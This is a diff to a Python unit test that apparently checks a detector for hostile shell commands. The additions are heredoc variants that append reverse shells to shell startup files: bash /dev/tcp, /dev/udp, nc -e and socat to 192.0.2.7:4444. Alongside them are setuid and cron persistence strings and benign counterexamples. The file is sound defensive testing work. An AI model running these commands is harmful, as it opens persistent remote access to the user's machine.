@@ -250,9 +250,18 @@ class CodingPack(unittest.TestCase):
                 "ln -sf /bin/bash /tmp/.X11-unix/sh && chmod +s /tmp/.X11-unix/sh", "chmod g+s /tmp/x", "chmod 6755 /tmp/x",
                 "echo '*/10 * * * * dev /usr/bin/python3 /tmp/.a.py' >> /var/spool/cron/crontabs/dev",
                 "echo 'bash -i >& /dev/tcp/192.0.2.7/4444 0>&1' >> ~/.bash_profile",
-                "echo 'nc -e /bin/sh 192.0.2.7 4444' >> ~/.bashrc")
+                "echo 'nc -e /bin/sh 192.0.2.7 4444' >> ~/.bashrc",
+                # #996 item 4: the same shell written to a startup file as a heredoc's body
+                "cat >> ~/.bashrc <<'EOF'\nbash -i >& /dev/tcp/192.0.2.7/4444 0>&1\nEOF",
+                "cat >> ~/.bash_profile <<'EOF'\nsh -i >& /dev/udp/192.0.2.7/4444 0>&1\nEOF",
+                "cat >> ~/.zshrc <<'EOF'\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.0.2.7:4444\nEOF",
+                "cat >> ~/.bashrc <<'EOF'\nexport FOO=bar\nbash -i >& /dev/tcp/192.0.2.7/4444 0>&1\nEOF",
+                "tee -a ~/.bashrc <<'EOF'\nbash -i >& /dev/tcp/192.0.2.7/4444 0>&1\nEOF",
+                "cat >> ~/.bashrc <<-'EOF'\n\tbash -i >& /dev/tcp/192.0.2.7/4444 0>&1\nEOF")
         benign = ("echo 'export PATH=$PATH:~/bin' >> ~/.bashrc", "crontab -l", "chmod 755 ./build.sh",
-                  "chmod u+x deploy.sh", "id -u", "groups", "cat /etc/passwd", "echo 'alias ll=ls' >> ~/.bashrc")
+                  "chmod u+x deploy.sh", "id -u", "groups", "cat /etc/passwd", "echo 'alias ll=ls' >> ~/.bashrc",
+                  "cat >> ~/.bashrc <<'EOF'\nexport PATH=$PATH:~/bin\nEOF",
+                  "cat >> notes.md <<'EOF'\nbash -i >& /dev/tcp/192.0.2.7/4444 0>&1\nEOF")
         new = {"TK-A011", "TK-A075", "TK-A076", "TK-A077", "TK-A078"}
         for pack, engine, e in self.every_pack():
             for command in held:
@@ -308,11 +317,15 @@ class CodingPack(unittest.TestCase):
             "echo 'bash -i >& /dev/tcp/192.0.2.7/4444 0>&1' >> ~/.zshenv",
             "echo 'bash -i >& /dev/tcp/192.0.2.7/4444 0>&1' >> ~/.zlogin",
             "echo 'bash -i >& /dev/tcp/192.0.2.7/4444 0>&1' >> ~/.bash_login",
-            "echo 'bash -i >& /dev/tcp/192.0.2.7/4444 0>&1' | tee ${TK_UNSET}-a ~/.profile")]
+            "echo 'bash -i >& /dev/tcp/192.0.2.7/4444 0>&1' | tee ${TK_UNSET}-a ~/.profile",
+            # #996 item 4: the same shell as a heredoc's body (quoted and double-quoted delimiters)
+            "cat >> ~/.bashrc <<'EOF'\nnc -e /bin/sh 192.0.2.7 4444\nEOF",
+            "cat >> ~/.bashrc <<\"EOF\"\nbash -i >& /dev/tcp/192.0.2.7/4444 0>&1\nEOF")]
         benign = ("chmod u-s x", "chmod 1777 x", "chmod 0755 x", "chmod -R go-w .", "gpasswd -d dev sudo",
                   "usermod -u 1001 dev", "usermod -c 'Greg G' dev", "cat /etc/group", "ls /var/spool/cron/crontabs",
                   "cat /etc/cron.daily/logrotate", "echo 'nc -zv localhost 80' >> notes.md",
                   "echo 'alias ports=\"nc -zv localhost\"' >> ~/.zshrc",
+                  "cat >> ~/.bashrc <<'EOF'\nnc -zv localhost 80\nEOF",
                   "install -m 755 x /usr/local/bin/x", "install -m 0755 x /usr/local/bin/x", "install -m 1777 x /tmp/x",
                   "install --mode=0644 x /usr/local/share/x", "install -m u+x x /usr/local/bin/x",
                   "install -m u-s x /usr/local/bin/x", "install -d /tmp/build", "install 4755 /tmp/dst",
